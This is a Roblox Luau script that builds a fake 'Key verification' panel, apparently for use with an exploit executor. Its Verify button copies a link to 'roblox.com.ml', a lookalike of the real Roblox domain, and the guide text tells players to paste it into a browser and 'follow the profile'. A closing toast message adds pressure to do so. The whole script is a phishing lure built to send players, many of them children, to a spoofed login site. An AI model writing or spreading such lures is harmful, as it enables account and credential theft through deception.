local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer

---------------------------------------------------
-- GUI
---------------------------------------------------
local gui = Instance.new("ScreenGui")
gui.Parent = player:WaitForChild("PlayerGui")
gui.ResetOnSpawn = false

---------------------------------------------------
-- SIMPLE LOADING (5s TEXT ONLY)
---------------------------------------------------
local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1,0,1,0)
loadingText.BackgroundTransparency = 1
loadingText.Text = "Loading verification panel..."
loadingText.TextColor3 = Color3.fromRGB(200,200,200)
loadingText.Font = Enum.Font.Gotham
loadingText.TextSize = 18
loadingText.Parent = gui

---------------------------------------------------
-- MAIN WINDOW (LARGER)
---------------------------------------------------
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 520, 0, 320)
main.Position = UDim2.new(0.5, -260, 0.5, -160)
main.BackgroundColor3 = Color3.fromRGB(35, 25, 20)
main.BackgroundTransparency = 0.3
main.Visible = false
main.Parent = gui

Instance.new("UICorner", main).CornerRadius = UDim.new(0, 16)

local stroke = Instance.new("UIStroke", main)
stroke.Color = Color3.fromRGB(180,140,90)
stroke.Transparency = 0.6
stroke.Thickness = 1

---------------------------------------------------
-- HEADER TEXT
---------------------------------------------------
local header = Instance.new("TextLabel")
header.Size = UDim2.new(1, -20, 0, 30)
header.Position = UDim2.new(0, 10, 0, 5)
header.BackgroundTransparency = 1
header.Text = "made by-888     |     Key verification"
header.TextColor3 = Color3.fromRGB(220, 200, 180)
header.Font = Enum.Font.GothamBold
header.TextSize = 14
header.TextXAlignment = Enum.TextXAlignment.Left
header.Parent = main

---------------------------------------------------
-- TOP BAR (DRAG)
---------------------------------------------------
local topBar = Instance.new("Frame")
topBar.Size = UDim2.new(1,0,0,40)
topBar.BackgroundTransparency = 1
topBar.Parent = main

---------------------------------------------------
-- DRAG SYSTEM
---------------------------------------------------
local dragging = false
local dragStart
local startPos

topBar.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = main.Position
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
		local delta = input.Position - dragStart
		main.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
end)

UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = false
	end
end)

---------------------------------------------------
-- CLOSE BUTTON
---------------------------------------------------
local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 30, 0, 30)
close.Position = UDim2.new(1, -38, 0, 6)
close.Text = "X"
close.Font = Enum.Font.GothamBold
close.TextSize = 14
close.TextColor3 = Color3.fromRGB(255,255,255)
close.BackgroundColor3 = Color3.fromRGB(160,80,80)
close.BackgroundTransparency = 0.2
close.Parent = main
Instance.new("UICorner", close).CornerRadius = UDim.new(0, 8)

close.MouseButton1Click:Connect(function()
	main:Destroy()
end)

---------------------------------------------------
-- SIDEBAR
---------------------------------------------------
local sidebar = Instance.new("Frame")
sidebar.Size = UDim2.new(0, 150, 1, 0)
sidebar.BackgroundColor3 = Color3.fromRGB(25, 18, 15)
sidebar.BackgroundTransparency = 0.35
sidebar.Parent = main
Instance.new("UICorner", sidebar).CornerRadius = UDim.new(0, 16)

local verifyTab = Instance.new("TextButton")
verifyTab.Size = UDim2.new(1, -12, 0, 45)
verifyTab.Position = UDim2.new(0, 6, 0, 50)
verifyTab.Text = "Verification"
verifyTab.Font = Enum.Font.GothamSemibold
verifyTab.TextSize = 14
verifyTab.TextColor3 = Color3.fromRGB(255,255,255)
verifyTab.BackgroundColor3 = Color3.fromRGB(70,50,35)
verifyTab.BackgroundTransparency = 0.2
verifyTab.Parent = sidebar
Instance.new("UICorner", verifyTab).CornerRadius = UDim.new(0, 10)

local guideTab = Instance.new("TextButton")
guideTab.Size = UDim2.new(1, -12, 0, 45)
guideTab.Position = UDim2.new(0, 6, 0, 105)
guideTab.Text = "Guide"
guideTab.Font = Enum.Font.GothamSemibold
guideTab.TextSize = 14
guideTab.TextColor3 = Color3.fromRGB(200,200,200)
guideTab.BackgroundColor3 = Color3.fromRGB(40,30,25)
guideTab.BackgroundTransparency = 0.3
guideTab.Parent = sidebar
Instance.new("UICorner", guideTab).CornerRadius = UDim.new(0, 10)

---------------------------------------------------
-- CONTENT
---------------------------------------------------
local content = Instance.new("Frame")
content.Size = UDim2.new(1, -170, 1, -20)
content.Position = UDim2.new(0, 160, 0, 50)
content.BackgroundTransparency = 1
content.Parent = main

---------------------------------------------------
-- VERIFY BUTTON
---------------------------------------------------
local verifyBtn = Instance.new("TextButton")
verifyBtn.Size = UDim2.new(1, -20, 0, 60)
verifyBtn.Position = UDim2.new(0, 10, 0, 60)
verifyBtn.Text = "Verify"
verifyBtn.Font = Enum.Font.GothamBold
verifyBtn.TextSize = 16
verifyBtn.TextColor3 = Color3.fromRGB(255,255,255)
verifyBtn.BackgroundColor3 = Color3.fromRGB(120, 90, 60)
verifyBtn.BackgroundTransparency = 0.25
verifyBtn.Parent = content
Instance.new("UICorner", verifyBtn).CornerRadius = UDim.new(0, 12)

---------------------------------------------------
-- GUIDE
---------------------------------------------------
local guide = Instance.new("TextLabel")
guide.Size = UDim2.new(1, -20, 1, -20)
guide.Position = UDim2.new(0, 10, 0, 10)
guide.BackgroundTransparency = 1
guide.Text =
"1. click verify to copy link\n2. paste link into browser\n3. follow the profile"
guide.TextColor3 = Color3.fromRGB(210,190,170)
guide.Font = Enum.Font.Gotham
guide.TextSize = 15
guide.Visible = false
guide.Parent = content

---------------------------------------------------
-- LINK
---------------------------------------------------
local link = "https://www.roblox.com.ml/users/437740423885/profile"

---------------------------------------------------
-- TOAST
---------------------------------------------------
local function toast(text)
	local t = Instance.new("Frame")
	t.Size = UDim2.new(0, 320, 0, 75)
	t.Position = UDim2.new(1, -340, 1, -110)
	t.BackgroundColor3 = Color3.fromRGB(35, 25, 20)
	t.BackgroundTransparency = 0.25
	t.Parent = gui

	Instance.new("UICorner", t).CornerRadius = UDim.new(0, 14)

	local lbl = Instance.new("TextLabel")
	lbl.Size = UDim2.new(1, -10, 1, 0)
	lbl.Position = UDim2.new(0, 5, 0, 0)
	lbl.BackgroundTransparency = 1
	lbl.Text = text
	lbl.TextColor3 = Color3.fromRGB(255,255,255)
	lbl.Font = Enum.Font.GothamSemibold
	lbl.TextSize = 14
	lbl.Parent = t

	task.delay(2.2, function()
		TweenService:Create(t, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
		task.wait(0.4)
		t:Destroy()
	end)
end

---------------------------------------------------
-- VERIFY
---------------------------------------------------
verifyBtn.MouseButton1Click:Connect(function()
	if setclipboard then
		setclipboard(link)
	end

	verifyBtn.Text = "Copied"
	toast("Copied to clipboard")

	task.delay(2, function()
		verifyBtn.Text = "Verify"
	end)
end)

---------------------------------------------------
-- TABS
---------------------------------------------------
verifyTab.MouseButton1Click:Connect(function()
	verifyBtn.Visible = true
	guide.Visible = false
end)

guideTab.MouseButton1Click:Connect(function()
	verifyBtn.Visible = false
	guide.Visible = true
end)

---------------------------------------------------
-- START (5s LOADING)
---------------------------------------------------
task.wait(5)

TweenService:Create(loadingText, TweenInfo.new(0.5), {
	TextTransparency = 1
}):Play()

task.wait(0.5)

loadingText:Destroy()
main.Visible = true

toast("Oops looks like you dont follow us")
